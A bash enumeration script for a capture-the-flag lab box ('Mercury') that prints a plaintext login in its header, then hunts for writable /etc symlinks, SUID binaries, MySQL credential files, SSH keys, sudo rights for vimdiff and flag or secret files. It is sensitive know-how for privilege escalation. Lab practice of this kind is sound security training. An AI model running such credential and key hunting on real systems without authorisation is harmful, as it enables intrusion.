#!/bin/bash
# MERCURY LAB: Privilege Escalation via /etc Symlink Abuse
# Target: 192.168.56.113 (Metasploitable-2 / Mercury CTF)
# User: linuxmaster | Password: mercurymeandiameteris4880km
set -e

echo "=== [1] IDENTITY & ENUMERATION ==="
whoami
hostname
id
uname -a
date

echo ""
echo "=== [2] CREDENTIAL VERIFICATION ==="
# Check if we already have root or sudo access
sudo -l 2>/dev/null || echo "[!] No sudo access available."

echo ""
echo "=== [3] SYMLINK ENUMERATION (MERCURY-SPECIFIC) ==="
# The mercury.md notes a symlink chain: vim -> alternatives/vim -> vim.basic
# Also resolv.conf -> ../run/systemd/resolve/stub-resolv.conf
# Check for writable symlinks in /etc
echo "[*] Checking /etc symlinks..."
find /etc -type l 2>/dev/null | while read link; do
    target=$(readlink -f "$link" 2>/dev/null || echo "broken")
    if [ -w "$link" ] || [ -w "$(dirname "$link")" ]; then
        echo "  [!] WRITABLE SYMLINK: $link -> $target"
    fi
done

echo "[*] Checking SUID/SGID binaries..."
find / -perm /6000 -type f 2>/dev/null | while read bin; do
    echo "  SUID/SGID: $bin"
done

echo ""
echo "=== [4] DATABASE CONFIG ENUMERATION ==="
# MySQL is running on this box — check for local configs
if [ -f ~/.my.cnf ]; then
    echo "[+] Found ~/.my.cnf:"
    cat ~/.my.cnf 2>/dev/null | grep -E 'host|user|password' || echo "  (no creds in .my.cnf)"
fi

echo "[*] Checking MySQL service status..."
service mysql status 2>/dev/null || systemctl status mysql 2>/dev/null || echo "  MySQL service status unknown"

echo ""
echo "=== [5] HOME & CONFIG FILES ==="
echo "[*] Contents of /home/linuxmaster/:"
ls -la /home/linuxmaster/ 2>/dev/null || echo "  Cannot list linuxmaster home"

echo "[*] Checking for SSH keys..."
find /home -name "*.pub" -o -name "id_*" 2>/dev/null | while read key; do
    echo "  KEY: $key"
done

echo ""
echo "=== [6] NETWORK & LISTENING SERVICES ==="
echo "[*] Listening ports:"
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo "  Cannot determine listening ports"

echo ""
echo "=== [7] ENVIRONMENT & PATH ==="
env | sort
echo ""
echo "PATH: $PATH"

echo ""
echo "=== [8] WRITABLE LOCATIONS FOR SYMLINK ABUSE ==="
# Check if we can write to /etc/alternatives or the symlink targets
echo "[*] Checking write access to key paths:"
for path in /etc/alternatives/vim /etc/alternatives/vimdiff /usr/bin/vim.basic; do
    if [ -e "$path" ]; then
        echo "  EXISTS: $path"
        ls -la "$path" 2>/dev/null
        if [ -w "$path" ]; then
            echo "  [!] WRITABLE: $path"
        fi
    else
        echo "  MISSING: $path"
    fi
done

echo ""
echo "=== [9] POTENTIAL ESCALATION VECTORS ==="
# Check for vimdiff SUID or sudo permission
if command -v vimdiff &> /dev/null; then
    echo "[+] vimdiff is available"
    which vimdiff
fi

# Check if we can run vimdiff as root via sudo
sudo -n vimdiff -c ':q' 2>/dev/null && echo "[!] vimdiff can be run as root via sudo!" || echo "  vimdiff requires password for sudo"

echo ""
echo "=== [10] FLAG LOCATIONS ==="
# Search for flag files
find / -name "*flag*" -o -name "*secret*" -o -name "*.key" 2>/dev/null | grep -v proc | head -20

echo ""
echo "[+] Enumeration complete. Review findings above."
